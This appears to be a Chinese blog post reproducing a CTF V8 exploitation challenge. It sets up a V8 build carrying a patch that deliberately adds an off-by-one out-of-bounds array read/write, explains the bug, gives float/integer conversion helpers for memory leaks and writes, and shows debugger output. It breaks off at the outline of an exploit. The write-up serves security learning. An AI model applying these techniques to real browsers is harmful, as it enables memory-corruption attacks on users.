<!DOCTYPE html><html lang="zh" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>V8 EXPLOIT ONE | I0gan</title><meta name="keywords" content="v8"><meta name="author" content="i0gan"><meta name="copyright" content="i0gan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="V8初探前言以前早就在ctf上看见过类似的v8引擎题，比如sctf，Downunder Ctf等等，这篇文章就来复现一下underdown ctf中的一个d8 pwn题，这也是个历年谷歌浏览器漏洞的一个cve，本篇参考faith的文章来学习一下v8。 ref:  https:&#x2F;&#x2F;faraz.faith&#x2F;2019-12-13-starctf-oob-v8-indepth&#x2F; 题目: 下载 下载好之后有">
<meta property="og:type" content="article">
<meta property="og:title" content="V8 EXPLOIT ONE">
<meta property="og:url" content="http://i0gan.pwnsky.com/2021/03/30/v8-01/index.html">
<meta property="og:site_name" content="I0gan">
<meta property="og:description" content="V8初探前言以前早就在ctf上看见过类似的v8引擎题，比如sctf，Downunder Ctf等等，这篇文章就来复现一下underdown ctf中的一个d8 pwn题，这也是个历年谷歌浏览器漏洞的一个cve，本篇参考faith的文章来学习一下v8。 ref:  https:&#x2F;&#x2F;faraz.faith&#x2F;2019-12-13-starctf-oob-v8-indepth&#x2F; 题目: 下载 下载好之后有">
<meta property="og:locale">
<meta property="og:image" content="http://i0gan.pwnsky.com/img/text_bg.jpg">
<meta property="article:published_time" content="2021-03-30T11:28:43.000Z">
<meta property="article:modified_time" content="2021-04-03T01:02:53.532Z">
<meta property="article:author" content="i0gan">
<meta property="article:tag" content="v8">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://i0gan.pwnsky.com/img/text_bg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://i0gan.pwnsky.com/2021/03/30/v8-01/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-03 09:02:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">68</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">30</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">24</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/text_bg.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">I0gan</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">V8 EXPLOIT ONE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-03-30T11:28:43.000Z" title="Created 2021-03-30 19:28:43">2021-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-04-03T01:02:53.532Z" title="Updated 2021-04-03 09:02:53">2021-04-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/v8/">v8</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="V8初探"><a href="#V8初探" class="headerlink" title="V8初探"></a>V8初探</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前早就在ctf上看见过类似的v8引擎题，比如sctf，Downunder Ctf等等，这篇文章就来复现一下underdown ctf中的一个d8 pwn题，这也是个历年谷歌浏览器漏洞的一个cve，本篇参考faith的文章来学习一下v8。</p>
<p>ref:  <a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></p>
<p>题目: <a target="_blank" rel="noopener" href="https://github.com/Changochen/CTF/raw/master/2019/*ctf/Chrome.tar.gz">下载</a></p>
<p>下载好之后有几个文件如下:</p>
<pre><code>[i0gan@arch Chrome]$ ls
ld-linux-x86-64.so.2  libc.so.6  oob.diff  Release</code></pre>
<h2 id="编译-v8"><a href="#编译-v8" class="headerlink" title="编译 v8"></a>编译 v8</h2><p>首先先下载谷歌的depot_tools</p>
<pre><code>git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</code></pre>
<p>设置环境变量</p>
<pre><code>echo &quot;export PATH=/home/i0gan/share/project/v8/tools/depot_tools:$PATH&quot; &gt;&gt; ~/.bashrc</code></pre>
<p>下载v8源码，这里需要翻墙下载</p>
<pre><code>fetch v8</code></pre>
<p>有点大，有3个多G</p>
<pre><code>cd v8
./build/install-build-deps.sh #这里采用ubuntu进行执行，我采用docker下的ubuntu16来进行构建编译环境的
git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598 # 切换到漏洞版本
gclient sync
git apply ../Chrome/oob.diff</code></pre>
<p>在ubuntu16下进行编译</p>
<h3 id="编译debug版"><a href="#编译debug版" class="headerlink" title="编译debug版"></a>编译debug版</h3><pre><code>./tools/dev/v8gen.py x64.debug
ninja -C ./out.gn/x64.debug</code></pre>
<h3 id="编译release版"><a href="#编译release版" class="headerlink" title="编译release版"></a>编译release版</h3><pre><code>./tools/dev/v8gen.py x64.release
ninja -C ./out.gn/x64.release</code></pre>
<p>下载还有编译过程需要时间有点长，耐心等待下，这里我就编译debug版本的，编译出来的文件会放在 <code>v8/out.gn/x64.debug/d8</code>.</p>
<pre><code>i0gan@1ae6cc5c827a:/home/project/v8/challs/chall_1/v8/out.gn$ du -sh x64.debug/
4.6G    x64.debug/</code></pre>
<h2 id="Patch文件"><a href="#Patch文件" class="headerlink" title="Patch文件"></a>Patch文件</h2><p>oob.diff文件如下</p>
<pre class=" language-diff"><code class="language-diff">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
<span class="token coord">--- a/src/bootstrapper.cc</span>
<span class="token coord">+++ b/src/bootstrapper.cc</span>
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
<span class="token inserted">+    SimpleInstallFunction(isolate_, proto, "oob",</span>
<span class="token inserted">+                          Builtins::kArrayOob,2,false);</span>
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
<span class="token coord">--- a/src/builtins/builtins-array.cc</span>
<span class="token coord">+++ b/src/builtins/builtins-array.cc</span>
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
<span class="token inserted">+BUILTIN(ArrayOob){</span>
<span class="token inserted">+    uint32_t len = args.length();</span>
<span class="token inserted">+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();</span>
<span class="token inserted">+    Handle&lt;JSReceiver> receiver;</span>
<span class="token inserted">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span>
<span class="token inserted">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span>
<span class="token inserted">+    Handle&lt;JSArray> array = Handle&lt;JSArray>::cast(receiver);</span>
<span class="token inserted">+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());</span>
<span class="token inserted">+    uint32_t length = static_cast&lt;uint32_t>(array->length()->Number());</span>
<span class="token inserted">+    if(len == 1){</span>
<span class="token inserted">+        //read</span>
<span class="token inserted">+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));</span>
<span class="token inserted">+    }else{</span>
<span class="token inserted">+        //write</span>
<span class="token inserted">+        Handle&lt;Object> value;</span>
<span class="token inserted">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span>
<span class="token inserted">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object>(1)));</span>
<span class="token inserted">+        elements.set(length,value->Number());</span>
<span class="token inserted">+        return ReadOnlyRoots(isolate).undefined_value();</span>
<span class="token inserted">+    }</span>
<span class="token inserted">+}</span>

 BUILTIN(ArrayPush) {
   HandleScope scope(isolate);
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 0447230..f113a81 100644
<span class="token coord">--- a/src/builtins/builtins-definitions.h</span>
<span class="token coord">+++ b/src/builtins/builtins-definitions.h</span>
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
<span class="token inserted">+  CPP(ArrayOob)                                                                \</span>
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
<span class="token coord">--- a/src/compiler/typer.cc</span>
<span class="token coord">+++ b/src/compiler/typer.cc</span>
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
<span class="token inserted">+    case Builtins::kArrayOob:</span>
<span class="token inserted">+      return Type::Receiver();</span>

     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:</code></pre>
<p>这个patch中修改了src/bootstrapper.cc，src/builtins/builtins-array.cc， src/builtins/builtins-definitions.h，src/compiler/typer.cc文件，然而变动最大的就是</p>
<p>src/builtins/builtins-array.cc文件，漏洞也在这个文件中，作者呢也强烈要求读者去自己尝试把漏洞标记出来，下面注释就是我做的一些解释，如下</p>
<pre class=" language-diff"><code class="language-diff">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
 // 漏洞patch
<span class="token inserted">+BUILTIN(ArrayOob){</span>
<span class="token inserted">+    uint32_t len = args.length();</span>
<span class="token inserted">+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value(); // 如果参数大于2，返回undefined</span>
<span class="token inserted">+    Handle&lt;JSReceiver> receiver;</span>
<span class="token inserted">+    // 执行一下的就要满足 len &lt;= 1，所以只剩下一个arg传入进来</span>
<span class="token inserted">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span>
<span class="token inserted">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span>
<span class="token inserted">+    Handle&lt;JSArray> array = Handle&lt;JSArray>::cast(receiver); //获取array</span>
<span class="token inserted">+    //将array元素强制转换为FixedDoubleArray</span>
<span class="token inserted">+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());</span>
<span class="token inserted">+    uint32_t length = static_cast&lt;uint32_t>(array->length()->Number()); // 再获取数组的长度</span>
<span class="token inserted">+    if(len == 1){</span>
<span class="token inserted">+        //read</span>
<span class="token inserted">+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));</span>
<span class="token inserted">+    }else{ //如果len &lt;= 0 </span>
<span class="token inserted">+        //write</span>
<span class="token inserted">+        Handle&lt;Object> value;</span>
<span class="token inserted">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span>
<span class="token inserted">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object>(1)));</span>
<span class="token inserted">+        elements.set(length,value->Number()); // 设置长度为 atgs.at&lt;Object>(1) 的int值，漏洞点，若能控制atgs.at&lt;Object>(1)，就可以达到数组越界</span>
<span class="token inserted">+        return ReadOnlyRoots(isolate).undefined_value();</span>
<span class="token inserted">+    }</span>
<span class="token inserted">+}</span></code></pre>
<p>下面贴下作者的原话:</p>
<p>I urge the reader to take a look at the code added to <code>src/builtins/builtins-array.cc</code> and try to spot the vulnerability. Even without any further context, it should be easy to spot.</p>
<ul>
<li>The function will initially check if the number of arguments is greater than 2 (the first argument is always the <code>this</code> argument). If it is, it returns undefined.</li>
<li>If there is only one argument (<code>this</code>), it will cast the array into a <code>FixedDoubleArray</code> before returning the element at <code>array[length]</code>.</li>
<li>If there are two arguments (<code>this</code> and <code>value</code>), it will write <code>value</code> as a float into <code>array[length]</code>.</li>
</ul>
<p>Now, since arrays start with index 0, it is evident that <code>array[length]</code> results in an out-of-bounds access by one index at the end of the array.</p>
<p>那么按照作者介绍js中的三种类型，v8采用一种pointer taggin的机制去分辨pointer，double还有smis类型，都代表一种快速小的整数，这些信息可以在src/objects.h中找到。三种类型分别分别定义如下:</p>
<pre><code>* Double: Shown as the 64-bit binary representation without any changes
* Smi: Represented as value &lt;&lt; 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
* Pointers: Represented as addr &amp; 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9</code></pre>
<p>还有一 注意的是，v8泄漏任何信息都以浮点数进行打印，也没有任何方式去正常表达64位的整型变量，所以的采用js的某些特殊手段将内存中的float类型以16进制方式打印出来，下面是作者提供的转换函数。</p>
<pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/// Helper functions to convert between float and integer primitives</span>
<span class="token keyword">var</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 8 byte array buffer</span>
<span class="token keyword">var</span> f64_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> u64_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint32Array</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">ftoi</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) = float</span>
    f64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>u64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token function">BigInt</span><span class="token punctuation">(</span>u64_buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Watch for little endianness</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">itof</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// typeof(val) = BigInt</span>
    u64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>val <span class="token operator">&amp;</span> 0xffffffffn<span class="token punctuation">)</span><span class="token punctuation">;</span>
    u64_buf<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">Number</span><span class="token punctuation">(</span>val <span class="token operator">></span><span class="token operator">></span> 32n<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> f64_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>ftoi: 将浮点类型转换为BigInt类型，用于泄漏内存</p>
<p>itof: 将BigInt类型转换为浮点类型，用于写入到内存，因为d8都是采用浮点类型进行储存的，采用一定转换后的格式才能正确在内存中写入值。</p>
<p>将上面保存为file.js</p>
<p>可以运行d8如下去执行，可以通过脚本实现转换。</p>
<pre><code>./d8 --shell ./file.js</code></pre>
<p>输出</p>
<pre><code>V8 version 7.5.0 (candidate)
d8&gt; ftoi(1234)
4653142004841054208n
d8&gt; itof(4653142004841054208n)
1234</code></pre>
<h2 id="数组末尾储存的是什么？"><a href="#数组末尾储存的是什么？" class="headerlink" title="数组末尾储存的是什么？"></a>数组末尾储存的是什么？</h2><p>可以通过到谷歌官方source code <a target="_blank" rel="noopener" href="https://source.chromium.org/">https://source.chromium.org</a> 查看源代码，但是不推荐，除非要有深刻的理解v8的代码才能知道内存的布局是什么。有另一种方法可以去知道内存布局。</p>
<p>通过debug版本的d8，可以实时的打印数组的内存布局，执行命令如下:</p>
<pre><code>./d8 --allow-natives-syntax</code></pre>
<p>若想进入到某些调试函数的话，可以采用%DebugPrint()</p>
<p>采用gdb调试效果如下:</p>
<pre><code>gdb ./d8
pwndbg&gt; run --allow-natives-syntax
Starting program: /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/d8 --allow-natives-syntax
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
[New Thread 0x7f9e54b5a700 (LWP 52)]
[New Thread 0x7f9e54359700 (LWP 53)]
[New Thread 0x7f9e53b58700 (LWP 54)]
[New Thread 0x7f9e53357700 (LWP 55)]
[New Thread 0x7f9e52b56700 (LWP 56)]
[New Thread 0x7f9e52355700 (LWP 57)]
[New Thread 0x7f9e51b54700 (LWP 58)]
V8 version 7.5.0 (candidate)
d8&gt; var a = [1.1, 2.2]; //定义触发漏洞的数组
undefined
d8&gt; %DebugPrint(a);
DebugPrint: 0x103bc188dd79: [JSArray]
 - map: 0x206bc6402ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0c7064ed1111 &lt;JSArray[0]&gt;
 - elements: 0x103bc188dd59 &lt;FixedDoubleArray[2]&gt; [PACKED_DOUBLE_ELEMENTS]
 - length: 2
 - properties: 0x305fab880c71 &lt;FixedArray[0]&gt; &#123;
    #length: 0x2108dfb001a9 &lt;AccessorInfo&gt; (const accessor descriptor)
 &#125;
 - elements: 0x103bc188dd59 &lt;FixedDoubleArray[2]&gt; &#123;
           0: 1.1
           1: 2.2
 &#125;
0x206bc6402ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x206bc6402e89 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;
 - prototype_validity cell: 0x2108dfb00609 &lt;Cell value= 1&gt;
 - instance descriptors #1: 0x0c7064ed1f49 &lt;DescriptorArray[1]&gt;
 - layout descriptor: (nil)
 - transitions #1: 0x0c7064ed1eb9 &lt;TransitionArray[4]&gt;Transition array #1:
     0x305fab884ba1 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x206bc6402f29 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;

 - prototype: 0x0c7064ed1111 &lt;JSArray[0]&gt;
 - constructor: 0x0c7064ed0ec1 &lt;JSFunction Array (sfi = 0x2108dfb0aca1)&gt;
 - dependent code: 0x305fab8802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0

[1.1, 2.2]
d8&gt;</code></pre>
<p>然而发现上面创建了4个线程，不方便调试通过设置UV_THREADPOOL_SIZE环境变量来改d8启动的线程数</p>
<pre><code>UV_THREADPOOL_SIZE=1</code></pre>
<p>尝试了，不行。</p>
<p>在调用数组oob()函数的时候崩溃。。。Arch linux与Ubuntu执行效果一样，出现了内存错误。。。</p>
<pre><code>d8&gt; a.oob()
#
# Fatal error in ../../src/objects/fixed-array-inl.h, line 321
# Debug check failed: index &gt;= 0 &amp;&amp; index &lt; this-&gt;length().
#
#
#
#FailureMessage Object: 0x7ffc874a2430
==== C stack trace ===============================

    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x21) [0x7f4f5960bcd1]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libplatform.so(+0x3fbb7) [0x7f4f595a4bb7]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x218) [0x7f4f595f7438]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(+0x35e7c) [0x7f4f595f6e7c]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8_libbase.so(V8_Dcheck(char const*, int, char const*)+0x27) [0x7f4f595f7507]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(v8::internal::FixedDoubleArray::get_scalar(int)+0x15d) [0x7f4f5797ed2d]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(+0x14fdf27) [0x7f4f57973f27]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(v8::internal::Builtin_ArrayOob(int, unsigned long*, v8::internal::Isolate*)+0xed) [0x7f4f57973b8d]
    /home/project/v8/challs/chall_1/v8/out.gn/x64.debug/libv8.so(+0x2a5a0c0) [0x7f4f58ed00c0]
Received signal 4 ILL_ILLOPN 7f4f59609271
Illegal instruction (core dumped)</code></pre>
<h2 id="Downunder-ctf-is-this-pwn-or-web"><a href="#Downunder-ctf-is-this-pwn-or-web" class="headerlink" title="Downunder ctf [is-this-pwn-or-web]"></a>Downunder ctf [is-this-pwn-or-web]</h2><p>查看diff文件与之前一样，下面为作者具体利用思路。</p>
<p>更新中…</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">/* This challenge is meant to be extremely hard. The way this exploit goes is
 * essentially as follows:
 *
 * Step 1: Read the patch.diff file to figure out the vulnerability
 *
 * Step 2: Use the vulnerability to get a corrupted float array. You can use
 *         this array to overwrite its own length to a very large number
 *
 * Step 3: Once you've done this, exploitation becomes (relatively) easy. There
 *         are loads of blog posts and other V8 exploits that you can use as
 *         a starting point. I'll list some below. The only issue will be that
 *         V8 somewhat recently started shipping with pointer compression, and
 *         most blog posts / exploits will be made for challenges / vulns from
 *         V8 versions without pointer compression.
 *
 * https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/
 * https://blog.exodusintel.com/2019/09/09/patch-gapping-chrome/
 * https://tcode2k16.github.io/blog/posts/2020-03-15-confidence-ctf/#chromatic-aberration
